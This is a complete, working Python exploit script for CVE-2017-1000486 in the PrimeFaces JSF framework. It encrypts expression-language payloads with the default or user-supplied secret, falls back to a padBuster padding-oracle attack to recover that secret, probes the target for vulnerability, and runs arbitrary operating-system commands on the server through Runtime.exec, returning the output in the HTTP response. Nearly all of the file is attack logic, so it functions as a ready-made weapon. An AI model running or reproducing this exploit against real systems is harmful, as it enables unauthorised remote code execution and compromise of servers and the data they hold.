import requests
import argparse
import sys
from Crypto.Hash import MD5
from Crypto.Cipher import DES
import base64
import os
import subprocess
from urllib.parse import unquote


#Alternative payload
#payloadEL=''
#payloadEL += '${session.setAttribute("run",""["class"].forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))}'
#payloadEL +='${session.setAttribute("cmd",session.getAttribute("run")["exec"]("ls"))}'
#payloadEL +='${session.setAttribute("stream",session.getAttribute("cmd").getInputStream())}'
#payloadEL +='${session.setAttribute("out",facesContext.getExternalContext().getResponseOutputStream())}'
#payloadEL +='${session.setAttribute("buffer","".format("%09999d", 0).getBytes())}'
#payloadEL +='${facesContext.getExternalContext().addResponseHeader("BUFFER",session.getAttribute("buffer"))}'
#payloadEL +='${facesContext.getExternalContext().addResponseHeader("N",session.getAttribute("stream").read(session.getAttribute("buffer"),"".length(),"".format("%0999d", 0).length()))}'
#payloadEL +='${session.getAttribute("out").write(session.getAttribute("buffer"))}'
#payloadEL +='${session.getAttribute("out").flush()}'
#payloadEL +='${session.getAttribute("out").close()}'

def encrypt(data, password):
    padding = 8 - len(data) % 8
    data += chr(padding) * padding
    # IV and "iterations count" extracted from primefaces sourcecode
    iterations = 19
    iv = b'\xa9\x9b\xc8\x32\x56\x34\xe3\x03'
    hasher = MD5.new()
    hasher.update(password.encode())
    hasher.update(iv)
    result = hasher.digest()

    for i in range(1, iterations):
        hasher = MD5.new()
        hasher.update(result)
        result = hasher.digest()

    cipher = DES.new(result[:8], DES.MODE_CBC, result[8:16])
    encrypted = cipher.encrypt(data)
    return str(base64.b64encode(encrypted).decode())

def findMethodIdx(class_name, method):
    print("[*] Searching for idx of method %s" % method)
    idx = 0
    while True:
        payloadEL = '${facesContext.getExternalContext().addResponseHeader("METHOD",facesContext.getELContext()["class"].forName("%s").getDeclaredMethods()[%d])}' % (class_name,idx)
        payload = encrypt(payloadEL,secret)
        data["pfdrid"]=payload
        r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
        if "METHOD" in r.headers and r.headers["METHOD"]!="" and "%s" % method in r.headers["METHOD"]:
            print("[|] FOUND! Method %s with index %d" % (r.headers["METHOD"],idx))
            return idx
        else:
            idx+=1

print("""   _____   _____   ___ __  _ ____    _  __   __   __  _ _  ___   __ 
  / __\\ \\ / / __|_|_  )  \\/ |__  |__/ |/  \\ /  \\ /  \\| | |( _ ) / / 
 | (__ \\ V /| _|___/ / () | | / /___| | () | () | () |_  _/ _ \\/ _ \\
  \\___| \\_/ |___| /___\\__/|_|/_/    |_|\\__/ \\__/ \\__/  |_|\\___/\\___/ by Pastea
""")

requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser( prog="CVE-2017-1000486.py",
                  formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                  epilog= '''
                   This script exploits an expression language remote code execution flaw in the Primefaces JSF framework.
                   Primefaces versions prior to 5.2.21, 5.3.8 or 6.0 are vulnerable to a padding oracle attack, 
                   due to the use of weak crypto and default encryption password and salt.
                  ''')

parser.add_argument("target", help="Target Host")
parser.add_argument("-c", "--cmd", default="id", help="Command to execute.")
parser.add_argument("-px", "--proxy", default="", help="Configure a proxy")
parser.add_argument("-el", "--payload", default="", help="Custom EL payload to execute")
parser.add_argument("-sc", "--secret", default="", help="Primefaces Secret")
parser.add_argument("-bs", "--bsize", default=9999, help="Buffer size")
args = parser.parse_args()

#Set proxy
proxy=None
if args.proxy:
    proxy = {"http":"http://%s" % args.proxy, "https":"https://%s" % args.proxy}

headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
        'Accept': '*/*',
}

sess = requests.Session() 
url = args.target.strip()
data = {"pfdrt":"sc", "ln":"primefaces", "pfdrid": ""}
secret = args.secret.strip()
bsize = int(("%s" % args.bsize).strip())

print("[+] PRIMEFACES SECRET")
if secret=="":
    print("[+] Input the primefaces secret (default: primefaces) or leave blank if you want to try to recover secret with Padding Oracle Attack:")
    secret = input("[+]> ")

info = {}

if secret!="":
    info["secret"] = secret
else:
    print("[+] Trying to retrieve Secret with Padding Oracle")
    payloadEL = '${facesContext["getExternalContext"]()["setResponseHeader"]("SECRET",initParam["primefaces.SECRET"])}'

    cmd = "./padBuster.pl \"{0}?pfdrt=sc&ln=primefaces&pfdrid=C24UkygWm3HMmnSxmDwoxw%3D%3D\" \"C24UkygWm3HMmnSxmDwoxw%3D%3D\" 8 -encoding 0 -plaintext '{1}'".format(url,payloadEL)
    if proxy:
        cmd+=" -proxy %s" % args.proxy
    print("[+] Executing: %s" % cmd)
    e = os.system(cmd)
    e=0
    if e==0:
        payload = input("[+] Insert value returned by padBuster:")
    else:
        exit(1)
    data["pfdrid"]=unquote(payload)
    r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
    if "SECRET" in r.headers:
        secret=r.headers["SECRET"]
        print("[+] Primefaces Secret retrieved: %s" % secret)
    else:
        print("[+] Unable to retrieve Primefaces Secret")
        exit(0)
print("\r")

print("[*] PRIMEFACES TEST")
print("[*] Checking if target URL is vulnerable")

payloadEL = '${facesContext["getExternalContext"]()["setResponseHeader"]("PROVA","123456")}'
payload = encrypt(payloadEL,secret)
data["pfdrid"]=payload 
r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
if "PROVA" in r.headers and r.headers["PROVA"]=="123456":
    print("[*] PRIMEFACES VULNERABLE")
else:
    print("[*] PRIMEFACES NOT VULNERABLE\r")
    exit(0)
print("\r")

print("[|] CHECKING AVAILABLE IMPLICIT VARIABLE")
info["implicitVariable"]=[]
implicitVariable = ["facesContext","application","initParam","session","view","component","cc","request","applicationScope","sessionScope","viewScope","requestScope","flowScope","flash","param","paramValues","header","headerValues","cookie","resource","pageContext"]
for v in implicitVariable:
    payloadEL = '${facesContext.getExternalContext().addResponseHeader("implicitVariable",%s)}' % v
    payload = encrypt(payloadEL,secret)
    data["pfdrid"]=payload
    r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
    if "implicitVariable" in r.headers and r.headers["implicitVariable"]!="":
        print("[|] %s [V] [%s]" % (v,r.headers["implicitVariable"]))
        info["implicitVariable"].append("%s" % v)
    else:
        print("[|] %s [X]" % v)
print("\r")

print("[|] RETRIEVING JAVA VERSION")
print("[|] Trying quick payload:")
payloadEL = '${facesContext.getExternalContext().addResponseHeader("JAVA.VERSION",""["class"].forName("java.lang.System").getDeclaredMethod("getProperties").invoke(null).getProperty("java.version"))}'
payload = encrypt(payloadEL,secret)
data["pfdrid"]=payload
r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
if "JAVA.VERSION" in r.headers and r.headers["JAVA.VERSION"]!="":
    print("[|] JAVA.VERSION: %s" % r.headers["JAVA.VERSION"])
    info["java.version"]=int(r.headers["JAVA.VERSION"].split(".")[1])
else:
    print("[|] Payload not working.")

if not "java.version" in info:
    print("[|] Trying payload:")
    getProperties_idx = findMethodIdx("java.lang.System","java.lang.System.getProperties()")

    payloadEL = '${facesContext.getExternalContext().addResponseHeader("JAVA.VERSION",""["class"].forName("java.lang.System").getDeclaredMethods()[%d].invoke(null).getProperty("java.version"))}' % getProperties_idx
    payload = encrypt(payloadEL,secret)
    data["pfdrid"]=payload
    r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
    if "JAVA.VERSION" in r.headers and r.headers["JAVA.VERSION"]!="":
        print("[|] JAVA.VERSION: %s" % r.headers["JAVA.VERSION"])
        info["java.version"]=int(r.headers["JAVA.VERSION"].split(".")[1])
print("\r")


print("[+] REMOTE COMMAND EXECUTION")
print("[+] Input the command to execute:")
command = input("[+]> ")
print("\r")

buffer_len = bsize

print("[*] Trying quick exploit. Generally works for Java >=8")
payloadEL = '${{facesContext.getExternalContext().getSession(true).putValue("stream",""["class"].forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null)["exec"]("{}").getInputStream())}}'.format(command)
payloadEL += '${{facesContext.getExternalContext().getSession(true).putValue("buffer","".format("%0{}d",0).getBytes())}}'.format(buffer_len)
payloadEL += '${{facesContext.getExternalContext().addResponseHeader("N",facesContext.getExternalContext().getSession(true).getValue("stream").read(facesContext.getExternalContext().getSession(true).getValue("buffer"),"".length(),"".format("%0{}d",0).length()))}}'.format(buffer_len)
payloadEL += '${{facesContext.getExternalContext().getResponseOutputStream().write(facesContext.getExternalContext().getSession(true).getValue("buffer"),"".length(),"".format("%0{}d",0).length()).flush().close()}}'.format(buffer_len)
payload = encrypt(payloadEL,secret)
data["pfdrid"]=payload
r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
if "N" in r.headers:
    print("[*]> %s" % r.text[:int(r.headers["N"])])
else:
    print("[*] Exploit failed!")

    print("[*] Trying more noisy exploit:")
    getRuntime_idx = findMethodIdx("java.lang.Runtime","java.lang.Runtime.getRuntime()")
    exec_idx = findMethodIdx("java.lang.Runtime","java.lang.Runtime.exec(java.lang.String)")
    write_idx = findMethodIdx("org.apache.catalina.connector.CoyoteOutputStream","org.apache.catalina.connector.CoyoteOutputStream.write(byte[])")
    #format_idx = findMethodIdx("java.lang.String","java.lang.String.format(java.lang.String")

    buffer_len = "0"* bsize

    ### Need to use workaroung length method of string in order to retrieve an Integer since ELParser interprete digit as Long :(
    payloadEL = '${facesContext.getExternalContext().getSession(true).putValue("runtime",facesContext.getELContext()["class"].forName("java.lang.Runtime").getDeclaredMethods()[%d].invoke(null))}' % getRuntime_idx
    payloadEL += '${facesContext.getExternalContext().getSession(true).putValue("stream",facesContext.getELContext()["class"].forName("java.lang.Runtime").getDeclaredMethods()[%d].invoke(facesContext.getExternalContext().getSession(true).getValue("runtime"),"%s").getInputStream())}' % (exec_idx, command)
    payloadEL += '${facesContext.getExternalContext().getSession(true).putValue("buffer","%s".getBytes())}' % buffer_len
    payloadEL += '${facesContext.getExternalContext().addResponseHeader("N",facesContext.getExternalContext().getSession(true).getValue("stream").read(facesContext.getExternalContext().getSession(true).getValue("buffer"),"".length(),"%s".length()))}' % buffer_len
    payloadEL += '${facesContext.getELContext()["class"].forName("org.apache.catalina.connector.CoyoteOutputStream").getDeclaredMethods()[%d].invoke(facesContext.getExternalContext().getResponseOutputStream(),facesContext.getExternalContext().getSession(true).getValue("buffer"))}' % write_idx
    payloadEL += '${facesContext.getExternalContext().getResponseOutputStream().flush().close()}'

    payload = encrypt(payloadEL,secret)
    data["pfdrid"]=payload
    r = requests.post(url, data=data, headers=headers, proxies=proxy, verify=False)
    if "N" in r.headers:
        print("[*]> %s" % r.text[:int(r.headers["N"])])
    else:
        print("[*] Exploit failed!")   
